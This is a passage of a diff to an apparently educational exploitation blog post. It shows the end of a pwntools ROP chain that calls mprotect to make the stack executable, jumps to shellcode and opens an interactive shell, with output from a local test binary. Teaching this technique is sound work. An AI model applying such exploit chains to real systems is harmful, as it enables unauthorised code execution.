+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000007</span><span class="p">)</span> <span class="c1"># PROT_READ | PROT_WRITE | PROT_EXEC | PROT_GROWSDOWN
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_addr</span><span class="p">)</span> <span class="c1"># POP RSI
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1bebe0</span> <span class="o">+</span> <span class="mi">120</span><span class="p">)</span> <span class="c1"># Length of stack
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_addr</span><span class="p">)</span> <span class="c1"># POP RDI
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_base</span> <span class="o">-</span> <span class="p">(</span><span class="n">stack_base</span> <span class="o">%</span> <span class="mh">0x1000</span><span class="p">))</span> <span class="c1"># Shellcode address
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">)</span> <span class="c1"># mprotect()
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span> <span class="c1"># Execute shellcode
+</span>
+<span class="c1"># Send payload
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The shellcode is executed even when NX is enabled.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 exploit.py
+<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./test'</span>: pid 2958
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+Stack overflow vuln: <span class="nv">$ $ </span><span class="nb">ls
+</span>core  exploit.py  input  <span class="nb">test  </span>test.c  test2  test2.c
+<span class="nv">$ $ </span><span class="nb">whoami
+</span>nihaal
+<span class="nv">$ </span><span class="err">$</span>
+</code></pre></div></div>
+
+<p>References:</p>
+<ol>
+  <li>https://burnttoys.blogspot.com/2011/04/how-to-allocate-executable-memory-on.html</li>
+  <li>https://man7.org/linux/man-pages/man2/mprotect.2.html</li>
+  <li>https://www.ret2rop.com/2018/08/make-stack-executable-again.html</li>
+  <li>https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf</li>
+  <li>https://nihaal-prasad.github.io/2020/10/14/return-oriented-programming-tutorial.html</li>
+  <li>https://en.wikipedia.org/wiki/NX_bit</li>
+</ol>
 
 <section class="related">
   <h3 style="color: black">Related Posts</h3>
   <ul class="post-list">
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2021/01/11/marking-the-stack-as-executable.html">
-          Marking The Stack As Executable
-        </a>
-      </li>
     
       <li style="color: black; font-size: 9;">
         <a href="/2021/01/09/lm-cyber-ctf-writeups-for-pwn-and-web-challenges.html">
@@ -303,6 +475,12 @@ ssh -i /home/user/.backups/id_rsa -p 2222 backupuser@[domain name I got from No-
       <li style="color: black; font-size: 9;">
         <a href="/2021/01/07/hooking-linux-function-calls-via-ld-preload.html">
           Hooking Linux Function Calls Via LD_PRELOAD
+        </a>
+      </li>
+    
+      <li style="color: black; font-size: 9;">
+        <a href="/2021/01/03/got-overwrite-using-format-strings.html">
+          GOT Overwrite Using Format Strings
         </a>
       </li>
     
